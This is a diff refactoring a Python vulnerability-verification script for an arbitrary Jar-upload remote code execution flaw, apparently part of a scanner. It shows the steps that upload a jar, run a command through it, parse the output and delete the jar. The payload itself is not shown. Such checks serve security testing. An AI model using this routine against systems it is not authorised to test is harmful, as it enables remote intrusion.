@@ -8,12 +8,9 @@ description: 任意Jar包上传导致远程代码执行漏洞
 import re
 import time
 import json
-import string
-import random
 import base64
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class Upload_Jar_BaseVerify:
     def __init__(self, url):
@@ -22,15 +19,12 @@ class Upload_Jar_BaseVerify:
             'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
         }
         self.upload_jar_name = 'check.jar'
-        self.capta=''
-        words=''.join((string.ascii_letters,string.digits))
-        for i in range(8):
-            self.capta = self.capta + random.choice(words)
+        self.capta = get_capta()
 
     def check_jar_exsits(self):
         list_jar_url = self.url + "/jars/"
         try:
-            response = requests.get(list_jar_url, headers = self.headers, verify = False, timeout = 10)
+            response = request.get(list_jar_url, headers = self.headers)
             if response.status_code == 200 and "application/json" in response.headers.get("Content-Type", ""):
                 r = json.loads(response.text)
                 for upload_file in r['files']:
@@ -47,7 +41,7 @@ class Upload_Jar_BaseVerify:
             'jarfile': (self.upload_jar_name, file_content, 'application/octet-stream')
             }
         try:
-            req = requests.post(upload_jar_url, headers = self.headers, files = files, timeout = 10, allow_redirects = False, verify = False)
+            req = request.post(upload_jar_url, headers = self.headers, files = files)
             return True
         except Exception as e:
             print(e)
@@ -56,7 +50,7 @@ class Upload_Jar_BaseVerify:
     def delete_exists_jar(self, jar_hash_name):
         single_jar_url = self.url + "/jars/" + jar_hash_name
         try:
-            response = requests.delete(single_jar_url, headers = self.headers, verify = False, allow_redirects = False, timeout=30)
+            response = request.delete(single_jar_url, headers = self.headers)
             if response.status_code == 200 and "application/json" in response.headers.get("Content-Type", ""):
                 return True
         except Exception as e:
@@ -80,7 +74,7 @@ class Upload_Jar_BaseVerify:
             else:
                 return False
         try:
-            r1 = requests.post(execute_cmd_url, headers = headers, data = data, verify = False, timeout=20)
+            r1 = request.post(execute_cmd_url, headers = headers, data = data)
             match = re.findall('\|@\|(.*?)\|@\|', r1.text)
             self.delete_exists_jar(jar_hash_name)
             if match:
